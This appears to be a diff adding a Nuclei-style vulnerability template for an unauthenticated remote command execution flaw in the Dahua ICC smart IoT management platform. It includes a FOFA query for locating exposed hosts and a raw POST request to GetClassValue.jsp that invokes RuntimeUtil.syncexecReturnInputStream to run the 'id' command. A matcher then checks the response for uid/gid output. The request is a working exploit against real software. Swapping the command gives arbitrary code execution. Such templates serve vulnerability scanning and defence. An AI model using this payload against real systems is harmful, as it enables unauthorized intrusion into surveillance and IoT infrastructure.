@@ -1,0 +1,34 @@
+id: DaHua-ICC-ZhiNengWuLianZongHeGuanLiPingTai-GetClassValue_jsp-RCE
+
+info:
+  name: 大华ICC智能物联综合管理平台 /evo-apigw/admin/API/Developer/GetClassValue.jsp 远程命令执行
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
+    大华ICC智能物联综合管理平台 /evo-apigw/admin/API/Developer/GetClassValue.jsp 接口存在远程命令执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。
+  reference:
+    - 
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Content-Type: application/json
+
+        {
+          "data": {
+              "clazzName": "com.dahua.admin.util.RuntimeUtil",
+              "methodName": "syncexecReturnInputStream",
+              "fieldName": ["id"]
+          }
+        }
+
+    matchers:
+      - type: dsl
+        name: 远程命令执行
+        dsl:
+          - "status_code==200 && contains_all(body,'uid=','gid=','groups=')"
